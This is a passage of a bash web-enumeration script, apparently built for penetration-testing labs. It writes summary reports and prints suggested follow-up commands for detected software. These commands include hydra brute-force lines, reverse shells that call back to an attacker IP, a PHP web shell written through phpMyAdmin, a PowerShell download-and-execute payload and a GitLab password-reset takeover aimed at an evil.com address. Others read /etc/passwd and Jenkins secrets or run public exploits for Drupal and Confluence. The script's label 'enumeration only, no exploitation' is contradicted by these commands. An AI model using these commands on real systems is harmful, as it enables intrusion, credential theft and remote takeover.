                "$work_dir/fingerprint/headers.txt" 2>/dev/null | head -20
            echo '```'
        fi
        echo ""

        # --- Sensitive Paths ---
        echo "## Sensitive Path Probes"
        echo ""
        if [[ -f "$work_dir/fingerprint/sensitive_paths.txt" ]]; then
            echo '```'
            grep -v '^#\|^$' "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null
            echo '```'
        fi
        echo ""

        # --- Robots.txt ---
        if [[ -f "$work_dir/fingerprint/robots.txt" ]] && \
           ! grep -q '# No robots' "$work_dir/fingerprint/robots.txt" 2>/dev/null; then
            echo "## robots.txt"
            echo ""
            echo '```'
            cat "$work_dir/fingerprint/robots.txt" 2>/dev/null | head -30
            echo '```'
            echo ""
        fi

        # --- Directory Findings ---
        echo "## Directory / File Findings"
        echo ""
        local count=""
        for f in "$work_dir/content/"*.txt; do
            [[ -f "$f" ]] || continue
            count=$(grep -c '|' "$f" 2>/dev/null); count=${count:-0}
            (( count > 0 )) || continue
            echo "### $(basename "$f") ($count results)"
            echo ""
            echo '```'
            # Show 200s first, then 301/302, then 401/403
            grep '| 200 |' "$f" 2>/dev/null | head -20
            grep '| 30[12] |' "$f" 2>/dev/null | head -10
            grep '| 40[13] |' "$f" 2>/dev/null | head -10
            echo '```'
            echo ""
        done

        # --- VHost Findings ---
        if [[ -f "$work_dir/vhosts/vhosts.txt" ]]; then
            local vhost_count=""
            vhost_count=$(grep -c '|' "$work_dir/vhosts/vhosts.txt" 2>/dev/null); vhost_count=${vhost_count:-0}
            if (( vhost_count > 0 )); then
                echo "## VHosts Discovered ★"
                echo ""
                echo '```'
                cat "$work_dir/vhosts/hosts_entries.txt" 2>/dev/null
                echo '```'
                echo ""
                echo "> Add the above to /etc/hosts and re-run webenum for each vhost."
                echo ""
            fi
        fi

        # --- Source Hints ---
        if [[ -f "$work_dir/fingerprint/source_hints.txt" ]]; then
            local hints_content=""
            hints_content=$(grep -v '===\|^$' "$work_dir/fingerprint/source_hints.txt" | head -30)
            if [[ -n "$hints_content" ]]; then
                echo "## Source Code Hints"
                echo ""
                echo '```'
                echo "$hints_content"
                echo '```'
                echo ""
            fi
        fi

        if is_nonempty_file "$work_dir/fingerprint/js_endpoints.txt"; then
            echo "## JavaScript Findings"
            echo ""
            echo '```'
            head -30 "$work_dir/fingerprint/js_endpoints.txt" 2>/dev/null
            echo '```'
            echo ""
        fi

        # --- Recursive Findings ---
        if [[ "$DEEP_MODE" == "true" ]] && [[ -d "$work_dir/content/recursive" ]]; then
            local rec_total=0
            local cnt=""
            for f in "$work_dir/content/recursive/"*.txt; do
                [[ -f "$f" ]] || continue
                cnt=$(grep -c '|' "$f" 2>/dev/null); cnt=${cnt:-0}
                rec_total=$(( rec_total + cnt ))
            done
            if (( rec_total > 0 )); then
                echo "## Recursive Findings ($rec_total total)"
                echo ""
                for f in "$work_dir/content/recursive/"*.txt; do
                    [[ -f "$f" ]] || continue
                    cnt=$(grep -c '|' "$f" 2>/dev/null); cnt=${cnt:-0}
                    (( cnt > 0 )) || continue
                    echo "### $(basename "$f") ($cnt)"
                    echo '```'
                    grep '| 200 |' "$f" 2>/dev/null | head -10
                    echo '```'
                    echo ""
                done
            fi
        fi

        # --- Param Findings ---
        if [[ "$DEEP_MODE" == "true" ]] && [[ -d "$work_dir/params" ]]; then
            local param_total=0
            local pcnt=""
            for f in "$work_dir/params/"*.txt; do
                [[ -f "$f" ]] || continue
                pcnt=$(grep -c '|' "$f" 2>/dev/null); pcnt=${pcnt:-0}
                param_total=$(( param_total + pcnt ))
            done
            if (( param_total > 0 )); then
                echo "## Parameter Discovery ($param_total found)"
                echo ""
                for f in "$work_dir/params/"*.txt; do
                    [[ -f "$f" ]] || continue
                    grep -v '^No\|^-\|^URL' "$f" 2>/dev/null | head -20
                done | sort -u
                echo ""
            fi
        fi

        # --- Next Steps ---
        echo "## Next Steps"
        echo ""
        echo "Full command library: \`$work_dir/loot/next_steps.txt\`"
        echo ""
        if is_nonempty_file "$work_dir/loot/next_steps.txt"; then
            awk '
                /^## / {shown++; if (shown > 4) exit}
                shown > 0 && !/^# Finding-Driven/ && !/^# Generated/ && !/^# Commands below/ {print}
            ' "$work_dir/loot/next_steps.txt"
        else
            echo "(no grounded web next-step commands generated)"
        fi
        echo ""
        echo "---"
        echo "*Generated by webenum — enumeration only, no exploitation*"

    } > "$summary_dir/summary.md"
    cp "$summary_dir/summary.md" "$summary_dir/summary.txt" 2>/dev/null || true

    # Generate quick_wins.txt — just the high-value lines for fast review
    {
        echo "# Quick Wins — $(date '+%Y-%m-%d %H:%M') — $url"
        echo ""

        echo "## Sensitive Paths"
        grep -v '^#\|^$' "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null | \
            head -20 | sed 's/^/  /'

        echo ""
        echo "## Robots.txt"
        grep -i 'Disallow:' "$work_dir/fingerprint/robots.txt" 2>/dev/null | \
            sed 's/^/  ROBOTS: /'
        # Per-entry curl probe for disallowed paths
        local disallow_paths
        disallow_paths=$(grep -i 'Disallow:' "$work_dir/fingerprint/robots.txt" 2>/dev/null \
            | grep -oP 'Disallow:\s*\K\S+' | grep -v '^\*$' | head -10)
        if [[ -n "$disallow_paths" ]]; then
            echo ""
            echo "  NEXT: probe robots.txt disallowed paths:"
            while IFS= read -r rpath; do
                printf "  curl -sk -o /dev/null -w '%%{http_code} %s\\n' '%s'\n" "${url%/}${rpath}" "${url%/}${rpath}"
            done <<< "$disallow_paths"
        fi

        echo ""
        echo "## 200 OK Hits"
        for f in "$work_dir/content/"*.txt; do
            [[ -f "$f" ]] || continue
            grep '| 200 |' "$f" 2>/dev/null | head -10 | sed 's/^/  /'
        done

        echo ""
        echo "## Auth Required (401)"
        local auth_paths=()
        for f in "$work_dir/content/"*.txt "$work_dir/content/recursive/"*.txt; do
            [[ -f "$f" ]] || continue
            while IFS= read -r auth_line; do
                auth_paths+=("${auth_line}")
                echo "  AUTH: ${auth_line}"
            done < <(grep '| 401 |' "$f" 2>/dev/null | head -5)
        done
        if (( ${#auth_paths[@]} > 0 )); then
            echo ""
            echo "  NEXT (401 paths — try default creds or auth bypass):"
            for auth_line in "${auth_paths[@]:0:3}"; do
                local auth_path
                auth_path=$(echo "${auth_line}" | awk '{print $1}')
                echo "  hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url} http-get ${auth_path}"
            done
        fi

        echo ""
        echo "## Sensitive Files Found"
        local sens_found=false
        for f in "$work_dir/content/"*.txt; do
            [[ -f "$f" ]] || continue
            local sens_hits
            sens_hits=$(grep -iE '\.(bak|sql|env|config|conf|xml|json|zip|tar|gz|old|backup|log).*\| 200 \|' "$f" 2>/dev/null | head -5)
            if [[ -n "${sens_hits}" ]]; then
                sens_found=true
                while IFS= read -r sens_line; do
                    printf '  SENS: %s\n' "$sens_line"
                done <<< "${sens_hits}"
            fi
        done
        if [[ "${sens_found}" == "true" ]]; then
            echo ""
            echo "  NEXT: download and inspect for credentials/secrets:"
            # Resolve actual paths from hits
            for f in "$work_dir/content/"*.txt; do
                [[ -f "$f" ]] || continue
                grep -iE '\.(bak|sql|env|config|conf|xml|json|zip|tar|gz|old|backup|log).*\| 200 \|' "$f" 2>/dev/null \
                    | awk '{print $1}' | head -5 \
                    | while IFS= read -r found_path; do
                        local clean_path
                        clean_path="${found_path%%\?*}"  # strip query string if any
                        echo "  curl -sk ${url%/}${clean_path} -o /tmp/loot_$(basename "$clean_path") && grep -iE 'pass|secret|key|token|user|db_' /tmp/loot_$(basename "$clean_path")"
                    done
            done
        fi

        echo ""
        echo "## Login Forms Found"
        local login_found=false
        for f in "$work_dir/content/"*.txt; do
            [[ -f "$f" ]] || continue
            local login_hits
            login_hits=$(grep -iE '/(login|signin|auth|wp-login|admin).*\| 200 \|' "$f" 2>/dev/null | head -3)
            if [[ -n "${login_hits}" ]]; then
                login_found=true
                while IFS= read -r login_line; do
                    printf '  LOGIN: %s\n' "$login_line"
                done <<< "${login_hits}"
            fi
        done
        if [[ "${login_found}" == "true" ]]; then
            echo ""
            echo "  NEXT (login form brute-force — adjust form params first):"
            echo "  hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url} http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'"
            echo "  # Always try manual: admin/admin, admin/password, admin/<domain>, admin/<hostname>"
        fi

        echo ""
        echo "## WordPress Detected"
        # Require live WP-login body or wp-content/wp-includes asset links.
        if _confirm_fingerprint "$url" "/wp-login.php" 'WordPress|wp-submit|name="log"' \
            || _confirm_fingerprint "$url" "/" '/wp-content/|/wp-includes/|<meta name="generator" content="WordPress'; then
            local wp_host
            wp_host=$(get_host "$url" | tr '.:' '_')
            echo "  WordPress detected — run baseline wpscan:"
            echo "  wpscan --url ${url} --enumerate u,p,t --plugins-detection passive -o /tmp/${wp_host}_wpscan_baseline.txt"
            echo "  # Aggressive plugin/theme/user enumeration:"
            echo "  wpscan --url ${url} --enumerate p --plugins-detection aggressive -o /tmp/${wp_host}_wpscan_plugins.txt"
            echo "  wpscan --url ${url} --enumerate u,vp,vt,cb --plugins-detection aggressive -o /tmp/${wp_host}_wpscan_vuln.txt"
            echo "  wpscan --url ${url} --enumerate u --passwords /usr/share/wordlists/fasttrack.txt -o /tmp/${wp_host}_wpscan_users.txt"
        else
            echo "  (none detected)"
        fi

        echo ""
        echo "## CMS / Framework Detected"
        {
            local cms_whatweb="$work_dir/fingerprint/whatweb.txt"
            local cms_paths="$work_dir/fingerprint/sensitive_paths.txt"
            local cms_any=false

            # Joomla — confirm via live admin panel body or meta generator tag
            if _confirm_fingerprint "$url" "/administrator/index.php" 'Joomla!|mod-login|name="passwd"' \
                || _confirm_fingerprint "$url" "/" '<meta name="generator" content="Joomla!'; then
                cms_any=true
                echo "  Joomla detected:"
                echo "  joomscan --url ${url} --enumerate-components"
                echo "  curl -sk ${url%/}/administrator/   # admin login panel"
                echo "  # Brute admin: hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt ${url} http-post-form '/administrator/index.php:username=^USER^&passwd=^PASS^&Submit=Login:F=Invalid'"
            fi

            # Drupal — confirm via meta generator, user-login form, or CHANGELOG
            if _confirm_fingerprint "$url" "/" '<meta name="generator" content="Drupal|user-login-form|Drupal\.settings' \
                || _confirm_fingerprint "$url" "/user/login" 'user-login-form|name="form_id"\s+value="user_login' \
                || _confirm_fingerprint "$url" "/CHANGELOG.txt" 'Drupal [0-9]'; then
                cms_any=true
                echo "  Drupal detected:"
                echo "  droopescan scan drupal -u ${url}"
                echo "  curl -sk ${url%/}/CHANGELOG.txt | head -5   # confirm version"
                echo "  # CVE-2018-7600 Drupalgeddon2 (Drupal <7.58 / <8.3.9 / <8.4.6 / <8.5.1) — no-MSF PoC:"
                echo "  git clone https://github.com/dreadlocked/Drupalgeddon2 /tmp/drupalgeddon2 2>/dev/null && ruby /tmp/drupalgeddon2/drupalgeddon2.rb ${url}"
                echo "  # Python alt: https://github.com/a2u/CVE-2018-7600"
                echo "  # CVE-2019-6340 Drupalgeddon3 (8.5.x/8.6.x REST) — see https://github.com/leonjza/CVE-2019-6340"
            fi

            # Apache Tomcat — confirm via Apache-Coyote server header or Tomcat manager realm
            if _confirm_fingerprint "$url" "/" 'Server:\s*Apache-Coyote|<title>Apache Tomcat' \
                || _confirm_fingerprint "$url" "/manager/html" 'Tomcat Manager|tomcat-users\.xml' "200|401|403"; then
                cms_any=true
                echo "  Apache Tomcat detected:"
                echo "  curl -sk ${url%/}/manager/html   # manager panel (try tomcat:tomcat, admin:admin)"
                echo "  nxc http ${url} -u tomcat -p tomcat --path /manager/html"
                echo "  # Deploy WAR shell: msfvenom -p java/jsp_shell_reverse_tcp LHOST=${KALI_IP} LPORT=4444 -f war -o shell.war"
                echo "  # Upload via manager: curl -u 'tomcat:tomcat' -T shell.war '${url%/}/manager/text/deploy?path=/shell'"
                echo "  # Trigger: curl ${url%/}/shell/"
                echo "  # Catch with: penelope -p 4444 -O"
            fi

            # Jenkins — confirm via X-Jenkins header or Jenkins-specific markup
            if _confirm_fingerprint "$url" "/" 'X-Jenkins:|X-Hudson:|Jenkins [0-9]|_class":"hudson\.' \
                || _confirm_fingerprint "$url" "/login" 'Jenkins|j_username'; then
                cms_any=true
                echo "  Jenkins detected:"
                echo "  curl -sk ${url%/}/login   # unauthenticated check"
                echo "  curl -sk ${url%/}/ | grep -oE 'Jenkins [0-9.]+' | head -1"
                echo "  # CVE-2024-23897 unauth arbitrary file read (Jenkins <2.442 / LTS <2.426.3) — Jan 2024:"
                echo "  wget -q '${url%/}/jnlpJars/jenkins-cli.jar' -O /tmp/jenkins-cli.jar"
                echo "  java -jar /tmp/jenkins-cli.jar -s '${url}' -http connect-node '@/etc/passwd' 2>&1 | tail -30"
                echo "  java -jar /tmp/jenkins-cli.jar -s '${url}' -http help '@/var/jenkins_home/secrets/master.key' 2>&1 | tail -5"
                echo "  # Chain: read secrets/master.key + credentials.xml → decrypt → admin → RCE"
                echo "  # Script console RCE (if admin access): ${url%/}/script"
                echo "  # Groovy reverse shell in script console:"
                echo "  # String cmd = 'bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1'"
                echo "  # ['bash','-c',cmd].execute()"
                echo "  # Catch with: penelope -p 4444 -O"
            fi

            # phpMyAdmin — confirm via PMA-specific login markup at common install paths
            if _confirm_fingerprint "$url" "/phpmyadmin/" 'pma_username|phpMyAdmin' \
                || _confirm_fingerprint "$url" "/pma/" 'pma_username|phpMyAdmin' \
                || _confirm_fingerprint "$url" "/phpMyAdmin/" 'pma_username|phpMyAdmin'; then
                cms_any=true
                echo "  phpMyAdmin detected:"
                echo "  curl -sk ${url%/}/phpmyadmin/   # login page"
                echo "  # Default creds: root/root, root/<blank>, phpmyadmin/phpmyadmin"
                echo "  # If access: SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'"
                echo "  # Trigger: curl '${url%/}/shell.php?cmd=id'"
            fi

            # Atlassian Confluence — confirm via login.action body
            if _confirm_fingerprint "$url" "/login.action" 'Confluence|atl-login|os_username' \
                || _confirm_fingerprint "$url" "/" 'X-Confluence-Request-Time:|Confluence [0-9]'; then
                cms_any=true
                echo "  Atlassian Confluence detected:"
                echo "  curl -sk ${url%/}/login.action | grep -oE 'Confluence [0-9.]+' | head -1"
                echo "  # CVE-2023-22527 unauth OGNL RCE (Confluence 8.0.0-8.5.3, fixed 8.5.4) — Jan 2024:"
                echo "  git clone https://github.com/Chocapikk/CVE-2023-22527 /tmp/cve-2023-22527 2>/dev/null"
                echo "  python3 /tmp/cve-2023-22527/exploit.py -u ${url} -c 'id'"
                echo "  # Fallback to CVE-2022-26134 (Confluence <7.18.1) — https://github.com/h3v0x/CVE-2022-26134"
                echo "  # Earlier CVE-2019-3396 path traversal → https://github.com/Yt1g3r/CVE-2019-3396_EXP"
            fi

            # GitLab — confirm via GitLab-specific login markup or meta tag
            if _confirm_fingerprint "$url" "/users/sign_in" 'GitLab|gitlab-logo|user\[login\]' \
                || _confirm_fingerprint "$url" "/" '<meta content="GitLab|X-Gitlab-|gl-ui' \
                || _confirm_fingerprint "$url" "/help" 'GitLab (Community|Enterprise) Edition'; then
                cms_any=true
                echo "  GitLab detected:"
                echo "  curl -sk ${url%/}/help | grep -oE 'GitLab (Community|Enterprise) Edition [0-9.]+' | head -1"
                echo "  # CVE-2023-7028 unauth admin takeover via password reset (GitLab 16.1.0-16.7.1):"
                echo "  curl -sk -X POST '${url%/}/users/password' \\\\"
                echo "    -H 'Content-Type: application/x-www-form-urlencoded' \\\\"
                echo "    --data 'user[email][]=admin@target.local&user[email][]=ATTACKER@evil.com'"
                echo "  # → reset link sent to BOTH emails; click the attacker one, set new admin password"
                echo "  # Post-admin: register a malicious runner or push .gitlab-ci.yml to a proj for RCE"
                echo "  # Older: CVE-2021-22205 ExifTool RCE (unauth) — https://github.com/Al1ex/CVE-2021-22205"
            fi

            # ownCloud — confirm via ownCloud-specific markup or status endpoint
            if _confirm_fingerprint "$url" "/status.php" '"installed":|"productname":"ownCloud"|"versionstring"' \
                || _confirm_fingerprint "$url" "/" 'ownCloud|oc-dialog|data-requesttoken'; then
                cms_any=true
                echo "  ownCloud detected:"
                echo "  # CVE-2023-49103 phpinfo leaks env vars incl. DB/admin creds (graphapi 0.2.x-0.3.0):"
                echo "  curl -sk '${url%/}/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php' \\\\"
                echo "    | grep -iE 'OWNCLOUD_(DB|ADMIN)|_ENV\\\\[|SECRET|PASSWORD|API_KEY|MYSQL_' | head -20"
                echo "  # Alt path (some installs): ${url%/}/index.php/apps/graphapi/vendor/.../GetPhpInfo.php"
            fi

            # Next.js — confirm via X-Powered-By header or _next asset references
            if _confirm_fingerprint "$url" "/" 'X-Powered-By:\s*Next\.js|/_next/static/|__NEXT_DATA__|__next'; then
                cms_any=true
                echo "  Next.js detected:"
                echo "  # CVE-2025-29927 middleware bypass — magic header skips middleware auth/validation:"
                echo "  for p in /admin /dashboard /api/admin /protected /settings; do"
                echo "    code_without=\$(curl -sk -o /dev/null -w '%{http_code}' '${url}'\$p)"
                echo "    code_with=\$(curl -sk -o /dev/null -w '%{http_code}' '${url}'\$p -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware')"
                echo "    echo \"\$p  without=\$code_without  with=\$code_with  \$([ \$code_without != \$code_with ] && echo BYPASS!)\""
                echo "  done"
                echo "  # Also try subrequest chain: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
            fi

            # Rejetto HFS 2.x — confirm via HFS-specific server header or UI markup
            if _confirm_fingerprint "$url" "/" 'Server:\s*HFS|HttpFileServer|HFS ~ http file server|Rejetto'; then
                cms_any=true
                echo "  Rejetto HFS 2.x detected:"
                echo "  # CVE-2024-23692 unauth template RCE via search param:"
                echo "  curl -sk \"${url%/}/?search=%00{.exec|whoami.}\"           # Windows"
                echo "  curl -sk \"${url%/}/?search=%00{.exec|id.}\"                # Linux (if applicable)"
                echo "  # Reverse shell (Windows): curl -sk \"${url%/}/?search=%00{.exec|powershell -c IEX(New-Object Net.WebClient).DownloadString('http://${KALI_IP}/rev.ps1').}\""
                echo "  # Public PoC: https://github.com/ifconfig-me/CVE-2024-23692"
            fi

            [[ "$cms_any" == "false" ]] && echo "  (no non-WordPress CMS detected)"
        }

        echo ""
        echo "## VHosts"
        if [[ -s "$work_dir/vhosts/hosts_entries.txt" ]]; then
            sed 's/^/  VHOST: /' "$work_dir/vhosts/hosts_entries.txt" 2>/dev/null
            echo ""
            echo "  NEXT: add to /etc/hosts and re-enumerate each vhost:"
            while IFS= read -r vhost_entry; do
                [[ -z "${vhost_entry}" ]] && continue
                local vhost_name
                vhost_name=$(echo "${vhost_entry}" | awk '{print $2}')
                [[ -n "${vhost_name}" ]] && echo "  ./webenum.sh --url http://${vhost_name}"
            done < "$work_dir/vhosts/hosts_entries.txt"
        else
            echo "  (none found)"
        fi

        echo ""
        echo "## Parameters Discovered"
        if [[ "$DEEP_MODE" == "true" ]] && [[ -d "$work_dir/params" ]]; then
            local param_lines
            param_lines=$(find "$work_dir/params" -name "*.txt" -exec grep -h '.' {} \; 2>/dev/null | grep -v '^No\|^-\|^URL' | head -10)
            if [[ -n "${param_lines}" ]]; then
                while IFS= read -r param_found_line; do
                    printf '  PARAM: %s\n' "$param_found_line"
                done <<< "${param_lines}"
                echo ""
                echo "  NEXT (test parameters for injection):"
                while IFS= read -r param_line; do
                    [[ -z "${param_line}" ]] && continue
                    local param_url xss_url
                    param_url=$(echo "${param_line}" | awk '{print $1}')
                    [[ -z "${param_url}" || "${param_url}" != http* ]] && continue
                    xss_url="${param_url/testvalue/%3Cscript%3Ealert(1)%3C%2Fscript%3E}"
                    echo "  curl -sk '${param_url/testvalue/1%27}' | head -60"
                    echo "  curl -sk '${param_url/testvalue/1%20or%201=1}' | head -60"
                    echo "  curl -sk '${xss_url}'"
                done <<< "${param_lines}"
            else
                echo "  (none found)"
            fi
        else
            echo "  (run with --deep to enable parameter discovery)"
        fi

    } > "$summary_dir/quick_wins.txt"

    success "Summary written to $summary_dir/summary.md"
    success "Plain-text summary written to $summary_dir/summary.txt"
    success "Quick wins written to $summary_dir/quick_wins.txt"
}

#==============================================================================
# USAGE
#==============================================================================
usage() {
    cat <<'EOF'
WEBENUM — Deep Web Enumeration Wrapper
Designed to run after recon.sh for thorough web-layer coverage.

USAGE:
  ./webenum.sh --url <URL> [OPTIONS]
  ./webenum.sh --from-recon <IP> [OPTIONS]

OPTIONS:
  --url URL          Target URL. e.g. http://10.10.10.5:8080
  --from-recon IP    Auto-detect HTTP URL(s) from recon.sh output
                       for the given IP (reads ~/toolkit/recon/<IP>/)
  --deep             Enable deep mode: recursive fuzzing + parameter discovery
  --vhost DOMAIN     Enable vhost fuzzing against this base domain
                       e.g. --vhost target.htb
  --root DIR         Output root directory (default: $TOOLKIT_ROOT/web)
  --threads N        ffuf thread count (default: 40)
  --rate N           ffuf max requests/sec, 0=unlimited (default: 0)
  --ffuf-ac          Enable ffuf autocalibration (-ac) after baseline review
  -h, --help         Show this help

EXAMPLES:
  # Standard run after recon finds HTTP
  ./webenum.sh --url http://10.10.10.5

  # Auto-detect URL from prior recon run
  ./webenum.sh --from-recon 10.10.10.5

  # HTTPS non-standard port
  ./webenum.sh --url https://10.10.10.5:8443

  # With vhost fuzzing (if you know the domain name)
  ./webenum.sh --url http://10.10.10.5 --vhost target.htb

  # Full deep mode — recursive + params + large wordlists
  ./webenum.sh --url http://10.10.10.5 --deep --vhost target.htb

  # Custom output directory (mirror recon layout)
  ./webenum.sh --url http://10.10.10.5 --root ~/pg

OUTPUT:
  <root>/<host>_<port>_<proto>/artifacts/
    fingerprint/     whatweb, headers, cookies, source hints, sensitive paths
    content/         ffuf directory and file fuzzing (JSON + text)
    content/recursive/  recursive fuzzing on interesting dirs (--deep)
    vhosts/          vhost fuzzing results + /etc/hosts entries
    params/          GET parameter discovery (--deep)
    summary/
      summary.md     Structured findings — read this first
      summary.txt    Plain-text alias of summary.md
      quick_wins.txt High-value lines only
    loot/
      next_steps.txt Finding-driven follow-up command library

MODES:
  standard (default)
    Phase 1: Fingerprinting (whatweb, headers, source hints, sensitive paths)
    Phase 2: Directory + file fuzzing (raft-medium wordlists)
    Phase 4: VHost fuzzing (if --vhost specified)
    Phase 6: Summary

  deep (--deep)
    All standard phases plus:
    Phase 3: Recursive fuzzing on discovered directories
    Phase 5: GET parameter discovery on found endpoints
    Phase 2: Also runs raft-large wordlist

NOTES:
  - Enumeration only — no exploitation, OffSec compliant
  - Re-run safely: completed phases are skipped
  - Ctrl+C cleans up all background jobs
  - Requires: ffuf, curl, python3 (for JSON parsing)
  - Optional: whatweb — fingerprinting degrades gracefully if missing
EOF
}

#==============================================================================
# ARGUMENT PARSING
#==============================================================================
if [[ "${OffSec_LIB_ONLY:-false}" == "true" ]]; then
    # shellcheck disable=SC2317
    return 0 2>/dev/null || exit 0
fi

TARGET_URL=""
FROM_RECON_IP=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        -h|--help|help)
            usage
            exit 0
            ;;
        --url)
            [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
            TARGET_URL="$2"
            shift 2
            ;;
        --from-recon)
            [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
            is_valid_ip "$2" || { error "Invalid IP for --from-recon: $2"; exit 1; }
            FROM_RECON_IP="$2"
            shift 2
            ;;
        --no-color)
            disable_colors
            shift
            ;;
        --deep)
            DEEP_MODE=true
            shift
            ;;
        --vhost)
            [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
            VHOST_DOMAIN="$2"
            shift 2
            ;;
        --root)
            [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
            OUTPUT_ROOT="$2"
            shift 2
            ;;
        --threads)
            [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
            THREADS="$2"
            shift 2
            ;;
        --rate)
            [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
            FFUF_RATE="$2"
            shift 2
            ;;
        --ffuf-ac)
            FFUF_AUTOCALIBRATE=true
            shift
            ;;
        -*)
            error "Unknown option: $1"
            usage
            exit 1
            ;;
        *)
            # Allow bare URL as positional arg
            TARGET_URL="$1"
            shift
            ;;
    esac
done

# --from-recon: auto-detect HTTP URLs from recon.sh output
if [[ -n "$FROM_RECON_IP" && -z "$TARGET_URL" ]]; then
    recon_dir="${TOOLKIT_ROOT}/recon/${FROM_RECON_IP}"
    if [[ ! -d "$recon_dir" ]]; then
        error "No recon data at ${recon_dir}. Run: ./recon.sh ${FROM_RECON_IP}"
        exit 1
    fi
    declare -a found_urls=()
    for nmap_file in "${recon_dir}/scans/"*nmap*; do
        [[ -f "$nmap_file" ]] || continue
        while IFS= read -r line; do
            port=$(echo "$line" | grep -oP '\d+(?=/tcp.*http)' | head -1)
            [[ -z "$port" ]] && continue
            if echo "$line" | grep -qi "ssl\|https"; then
                proto="https"
            else
                proto="http"
            fi
            url="${proto}://${FROM_RECON_IP}"
            [[ "$port" != "80" && "$port" != "443" ]] && url="${url}:${port}"
            # Deduplicate
            dup=false
            for u in "${found_urls[@]+"${found_urls[@]}"}"; do
                [[ "$u" == "$url" ]] && dup=true
            done
            [[ "$dup" == false ]] && found_urls+=("$url")
        done < <(grep -iE 'open.*http' "$nmap_file" 2>/dev/null || true)
    done
    if (( ${#found_urls[@]} == 0 )); then
        error "No HTTP services found in recon data for ${FROM_RECON_IP}"
        exit 1
    elif (( ${#found_urls[@]} == 1 )); then
        TARGET_URL="${found_urls[0]}"
        info "Auto-detected from recon: ${TARGET_URL}"
    else
        info "Multiple HTTP services found for ${FROM_RECON_IP}:"
        for i in "${!found_urls[@]}"; do
            echo "  $((i+1)). ${found_urls[$i]}"
        done
        TARGET_URL="${found_urls[0]}"
        info "Using first URL: ${TARGET_URL} (run again with --url for others)"
    fi
fi

if [[ -z "$TARGET_URL" ]]; then
    error "No URL specified. Use --url or --from-recon."
    usage
    exit 1
fi

# Ensure URL has a scheme
if ! echo "$TARGET_URL" | grep -qP '^https?://'; then
    TARGET_URL="http://${TARGET_URL}"
    warn "No scheme detected — assuming http: ${TARGET_URL}"
fi

if ! is_positive_integer "$THREADS" || (( THREADS > 500 )); then
    error "--threads must be an integer between 1 and 500"
    exit 1
fi

if ! is_nonnegative_integer "$FFUF_RATE"; then
    error "--rate must be a non-negative integer"
    exit 1
fi

#==============================================================================
# OUTPUT DIRECTORY SETUP
#==============================================================================
PROTO=$(get_proto "$TARGET_URL")
HOST=$(get_host "$TARGET_URL")
PORT=$(get_port "$TARGET_URL")
if [[ -z "$PROTO" || -z "$HOST" || ! "$PORT" =~ ^[0-9]+$ ]]; then
    error "Could not parse target URL: $TARGET_URL"
    exit 1
fi
TARGET_TAG="${HOST}_${PORT}_${PROTO}"
OUTPUT_DIR="${OUTPUT_ROOT}/${TARGET_TAG}/artifacts"
if ! mkdir -p "${OUTPUT_DIR}"; then
    error "Failed to create output directory: ${OUTPUT_DIR}"
    exit 1
fi

# Reachability precheck — fail fast instead of wasting engagement time on a dead host
if ! curl -sS -o /dev/null --max-time 5 -k "$TARGET_URL" 2>/dev/null; then
    error "Target unreachable: $TARGET_URL (curl --max-time 5 failed)"
    error "Verify host/port/scheme before running webenum."
    exit 1
fi

#==============================================================================
# PRE-FLIGHT
#==============================================================================
header "WEBENUM — Deep Web Enumeration"

echo ""
info "Target:   $TARGET_URL"
info "Host:     $HOST"
info "Port:     $PORT"
info "Output:   $OUTPUT_DIR"
info "Mode:     $(if [[ "$DEEP_MODE" == "true" ]]; then echo 'DEEP (recursive + params)'; else echo 'STANDARD'; fi)"
info "Threads:  $THREADS"
info "ffuf -ac: $(if [[ "$FFUF_AUTOCALIBRATE" == "true" ]]; then echo 'enabled'; else echo 'disabled'; fi)"
[[ -n "$VHOST_DOMAIN" ]] && info "VHosts:   *.${VHOST_DOMAIN}"
echo ""

# Tool checks
info "Checking tools..."
TOOLS_PRESENT=()
TOOLS_MISSING=()
REQUIRED_TOOLS=(ffuf curl python3)
OPTIONAL_TOOLS=(whatweb jq sslscan openssl wafw00f gowitness eyewitness httpx-toolkit davtest cadaver)
for t in "${REQUIRED_TOOLS[@]}"; do
    if check_tool "$t"; then
        TOOLS_PRESENT+=("$t")
        echo -e "  ${GREEN}✓${NC} $t"
    else
        TOOLS_MISSING+=("$t")
        echo -e "  ${RED}✗${NC} $t (required missing)"
    fi
done
if (( ${#TOOLS_MISSING[@]} > 0 )); then
    error "Missing required tools: ${TOOLS_MISSING[*]}"
    error "Install: sudo apt install ${TOOLS_MISSING[*]}"
    exit 1
fi

OPTIONAL_MISSING=()
for t in "${OPTIONAL_TOOLS[@]}"; do
    if [[ "$t" == "httpx-toolkit" ]]; then
        if httpx_tool >/dev/null 2>&1; then
            echo -e "  ${GREEN}✓${NC} httpx-toolkit/httpx"
        else
            OPTIONAL_MISSING+=("$t")
            echo -e "  ${YELLOW}✗${NC} $t (optional; related evidence skipped)"
        fi
    elif check_tool "$t"; then
        echo -e "  ${GREEN}✓${NC} $t"
    else
        OPTIONAL_MISSING+=("$t")
        echo -e "  ${YELLOW}✗${NC} $t (optional; related evidence skipped)"
    fi
done
if (( ${#OPTIONAL_MISSING[@]} > 0 )); then
    warn "Optional tools missing: ${OPTIONAL_MISSING[*]}"
    warn "Install baseline extras with: sudo ./tools_setup.sh"
fi

echo ""
info "Wordlist status:"
